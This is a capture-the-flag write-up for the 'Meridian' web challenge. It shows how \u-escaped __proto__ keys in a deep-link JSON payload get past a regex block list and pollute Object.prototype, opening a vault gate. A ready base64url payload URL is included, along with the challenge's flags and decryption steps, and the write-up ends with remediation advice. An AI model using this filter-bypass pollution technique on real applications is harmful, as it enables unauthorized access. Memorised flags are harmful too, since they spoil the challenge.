---
title: "The Meridian"
description: "The site is a hash-routed SPA (nothing renders from the server). The useful surface is all in the JavaScript:"
event: "isfcr"
category: "web"
categoryLabel: "Web"
tags: ["ISFCR CTF 2026","web"]
date: "2026-10-10"
teammate: true
source: "isfcr/writeups/meridian.md"
---

> A little museum of photographic time. Fourteen prints on display, and one
> negative the public never gets to see.
>
> Target: `https://isfcrpesu-the-meridian.chals.io`
> Build: `2024.11-public`

## Flags

| # | Where | Flag |
|---|-------|------|
| 1 | **Vault** — negative `MRD-0000-0000` (the never-exhibited one) | `isfcr{d33p_m3rg3_p0llut3s_th3_pr0v3n4nc3_v4ult_1n_th3_m3r1d14n}` |
| 2 | Legacy staff console | `isfcr{l3g4cy_st4ff_c0ns0l3_1s_n0t_th3_v4ult}` |
| 3 | `RegistrarV2.SELFTEST` (wrong pepper) | `isfcr{wr0ng_p3pp3r_r1ght_curs3}` |
| 4 | Verdigris `provenance` cert, ROT-13 | `isfcr{pr0v3n4nc3_pl4qu3_w4s_a_f0rg3ry}` |

---

## 1. Recon

The site is a hash-routed SPA (nothing renders from the server). The useful
surface is all in the JavaScript:

```
index.html
vendor/mcrypto.js                     # SHA-256 + AES-256-GCM
assets/js/core.js                     # config engine, provenance, vault client
data/meridian-data.js                 # 14 exhibits + vault blob + legacy console
assets/js/legacy/provenance-v2.js     # old registrar pepper + SELFTEST
assets/js/art.js
assets/js/app.js                      # routes/views, deep-link handling
```

The interesting routes are `#/staff` and `#/vault`. Neither is linked in the UI,
but the footer prints them and the journal references them:

- Stock browser on a plain module: `LOCALSTORAGE_KEY = "meridian:view"`
- Chevron: `route()` and `loadConfig(r)` pull `localStorage` plus a shared
  deep-link `#/...?s=<base64url(JSON)>`.

---

## 2. The vault gate (`core.js`)

```js
function sanitizeConfig(cfg) {
  var clean = {}, src = cfg.features || {}, own = Object.keys(src);
  for (var i = 0; i < own.length; i++)
    if (FEATURE_ALLOWLIST.indexOf(own[i]) !== -1) clean[own[i]] = src[own[i]];
  cfg.features = clean;
  cfg.access = { tier: "guest" };
  if (Object.prototype.hasOwnProperty.call(cfg, "vault")) delete cfg.vault;   // <-- own vault dropped
  return cfg;
}

// vault client — reads an operator descriptor { curators:[...], rounds:N }
function openVault(cfg, vault) {
  var d = cfg.vault;
  if (!isObj(d) || !Array.isArray(d.curators) || typeof d.rounds !== "number") return { state: "sealed" };
  if (d.rounds < 1 || d.rounds > 20000) return { state: "sealed" };
  var h = M.strToBytes(vault.bsalt + ":" + d.curators.join("|"));
  for (var i = 0; i < d.rounds; i++) h = M.sha256(h);
  var pt = M.aesGcmDecrypt(h, ..., vault.aad);
  return pt ? { state: "open", text: M.bytesToStr(pt) } : { state: "rejected" };
}
```

Two things matter:

1. `sanitizeConfig` only deletes an **own** `vault` property. A value inherited
   from the prototype chain still reaches `openVault`.
2. The deep-link filter is a *blunt* regex:

```js
// core.js — deep-link screening (WAF rule MRD-7)
var BLOCK = /__proto__|constructor|prototype/i;
function parseStatePayload(text) {
  if (typeof text !== "string" || BLOCK.test(text)) return null;
  try { var o = JSON.parse(text); return isObj(o) ? o : null; } catch (e) { return null; }
}
```

And `deepMerge`, used to layer configs, walks every own key and assigns
`target[k] = …` — the classic prototype-pollution gadget:

```js
function deepMerge(target, source) {
  if (!isObj(target)) target = {};
  if (!isObj(source)) return source;
  for (var k in /* Object.keys(source) */)
    if (isObj(sv)) target[k] = deepMerge(isObj(target[k]) ? target[k] : {}, sv);
    else target[k] = sv;
  return target;
}
```

### 2.1 Filter bypass

`JSON.parse` accepts `\uXXXX` escapes. The literal substring `__proto__` never
appears in the raw text, so the regex passes, while `JSON.parse` produces an
**own** `"__proto__"` property:

```json
{"\u005f\u005fproto\u005f\u005f": {"vault": {...}}}
```

- regex test on raw text → `false` (evades `BLOCK`)
- `Object.keys(parsed)` → `["__proto__"]` (JSON.parse uses CreateDataProperty)

`deepMerge(cfg, link)` reads `target.__proto__`, sees `Object.prototype` (an
object), and merges the payload **into `Object.prototype`** rather than onto
`cfg`. After `sanitizeConfig` runs, `cfg` has no own `vault`, so `cfg.vault`
resolves up the chain to the injected descriptor.

The journal even foreshadows it:

> *"Shared view links are screened for a handful of dangerous words before we
> read them. It is a blunt instrument, and our engineers remind us daily that
> blunt instruments are only as good as the parser behind them."*

### 2.2 Delivery

```
https://isfcrpesu-the-meridian.chals.io/#/vault?s=<base64url(JSON)>
```

The same trick unlocks the **staff console** (`staffConsoleUnlocked` checks
`cfg.features.vault === true`, and `cfg.features` shadows `Object.prototype`):

```
https://isfcrpesu-the-meridian.chals.io/#/staff?s=eyJcdTAwNWZcdTAwNWZwcm90b1x1MDA1Zlx1MDA1ZiI6eyJ2YXVsdCI6dHJ1ZX19
```

---

## 3. Deriving the operator descriptor

The vault needs `{ curators, rounds }`, but the site only hints at how to build
it. The **legacy console** gives the re-key memo — its `masked` lines are simply
XOR'd with the current pepper `meridian::provenance::v3::do-not-share`:

```js
function unmask(masked) {
  var mb = b64ToBytes(masked), kb = strToBytes(PEPPER);
  for (i) out[i] = mb[i] ^ kb[i % kb.length];
}
```

Unmasked:

```
LEGACY CONSOLE SESSION RESTORED - operator token: isfcr{l3g4cy_st4ff_c0ns0l3_1s_n0t_th3_v4ult}
This token opened the old console only. It does NOT open the vault.

--- REG-2291 vault re-key procedure (2021) ---
The vault no longer trusts the console. It reads an operator descriptor from runtime config: vault = { curators: [...], rounds: N }.
curators: the curator of every piece whose certificate verifies against the CURRENT registrar pepper, in accession order. The gallery badge is not a verification.
rounds: 1000 + (sum of the accession years of those same pieces, mod 4096).
Public builds strip any vault descriptor they can see. Staff: use the registrar build.
```

### 3.1 Certificate verification

`hasCertificate` (the green "✓ Verified provenance" badge) only checks that
`sig` is a 12-character string — it is **not** a verification. The real check is
`registrarVerify`:

```js
function registrarVerify(ex, pepper) {
  var msg = ex.accession + "|" + ex.title + "|" + ex.curator + "|" + pepper;
  return typeof ex.sig === "string" &&
    ex.sig.toLowerCase() === hex(sha256(strToBytes(msg))).slice(0, 12);
}
```

`core.js` uses the **current** pepper (v3); `legacy/provenance-v2.js` uses the
old one (v2, `meridian::provenance::v2::rotate-me`). Against the v3 pepper only
**5 of 14** exhibits verify:

| Accession | Curator | Year |
|-----------|---------|------|
| MRD-1971-0148 | E. Vantar | 1971 |
| MRD-1984-0912 | R. Oikawa | 1984 |
| MRD-1990-0025 | H. Delacroix | 1990 |
| MRD-2003-0777 | K. Adeyemi | 2003 |
| MRD-2011-0410 | S. Marchetti | 2011 |

The rest are forged, unsigned, or signed with the rotated-out v2 pepper
(and `Verdigris` carries a ROT-13 certificate that decodes to a flag).

### 3.2 Descriptor

```
curators = ["E. Vantar","R. Oikawa","H. Delacroix","K. Adeyemi","S. Marchetti"]
sum      = 1971 + 1984 + 1990 + 2003 + 2011 = 9959
rounds   = 1000 + (9959 mod 4096) = 1000 + 1767 = 2767
```

---

## 4. Opening the seal

The vault is AES-256-GCM, keyed by iterated SHA-256:

```
key = SHA256^(2767)( "MRD::vault::9f3ac1b7e0:" + "E. Vantar|R. Oikawa|H. Delacroix|K. Adeyemi|S. Marchetti" )

aad = "meridian-vault"
iv  = base64 "a2gpIv8Fce9MB8bC"
ct  = base64 "16VfNalZHTHnm5LdieJJ7GCGp48lV9ndvOvpwV+K9PJvCPBkm3gq5eYP27oMDODW5O5FjHymqzG9Z22k8B1T"
tag = base64 "eaJXygDaK/tVfl0Rg5QGFw=="
```

`aesGcmDecrypt` returns:

```
isfcr{d33p_m3rg3_p0llut3s_th3_pr0v3n4nc3_v4ult_1n_th3_m3r1d14n}
```

### Implementation note

The analysis sandbox had no `eval`, `crypto.subtle`, `Buffer`, or `DataView`,
only `Uint8Array`. The site's `vendor/mcrypto.js` was ported by hand (SHA-256 +
AES-256 key schedule + GCM), replacing `DataView` reads/writes with manual
big-endian helpers. A first attempt produced a tag mismatch; the cause was a
mis-transcribed row-2 `ShiftRows` (`s[2][2]=s[2][3]` instead of
`s[2][2]=t;s[2][3]=t2`). The corrected port is validated against the NIST
AES-256-GCM vector (zero key, zero IV, empty PT/AAD):

```
tag = 530f8afbc74536b9a963b4f1c4cb738b   ✓
```

---

## 5. Other loot

**Legacy console flag** (from the XOR-unmasked memo, §3):

```
isfcr{l3g4cy_st4ff_c0ns0l3_1s_n0t_th3_v4ult}
```

**Registrar v2 self-test** — `legacy/provenance-v2.js` embeds a masked token
intended to be unmasked with the v2 pepper. It validates the *wrong* (rotated)
pepper:

```
isfcr{wr0ng_p3pp3r_r1ght_curs3}
```

**Verdigris certificate** — the exhibit's `provenance` field is hex:

```
76667370657b636530693361346170335f6379346468335f6a34665f6e5f7330657433656c7d
→ vfspe{ce0i3a4ap3_cy4dh3_j4f_n_s0et3el}   (ROT-13)
→ isfcr{pr0v3n4nc3_pl4qu3_w4s_a_f0rg3ry}
```

---

## 6. Root cause / fix

- **Never merge untrusted (deep-linked / `JSON.parse`d) data into config objects
  with a recursive assign.** Reject `__proto__` / `constructor` / `prototype`
  keys *after* parsing, create target objects with `Object.create(null)`, or use
  a hardened merge.
- **String blacklists are not input validation.** `\u` escapes defeat a regex
  filter; parse first and validate the resulting object graph.
- **Don't gate secrets on prototype-chain lookups.** `sanitizeConfig` deleted the
  own `vault` key but still honored an inherited one.
- **A 12-char length check is not provenance.** Verify signatures against the
  active key before rendering a trust badge.

## 7. Timeline of the solve

1. Fetch the SPA sources; note `#/staff` and `#/vault` are in the footer only.
2. Read `core.js` → spot `deepMerge`, the `BLOCK` regex, `openVault`, and the
   v3 pepper; read the journal hint about "blunt instruments".
3. Read `data/meridian-data.js` → the vault blob and the XOR-`masked` console.
4. Unmask the console with the v3 pepper → operator token + re-key memo.
5. Reimplement `registrarVerify` → the 5 valid certs, curators, and `rounds`.
6. Port `mcrypto.js` (SHA-256 + AES-GCM), validate, decrypt the blob.
7. Build the `\u005f`-escaped deep-link payload that pollutes `Object.prototype`
   and confirm it survives `sanitizeConfig` and reaches `openVault`.
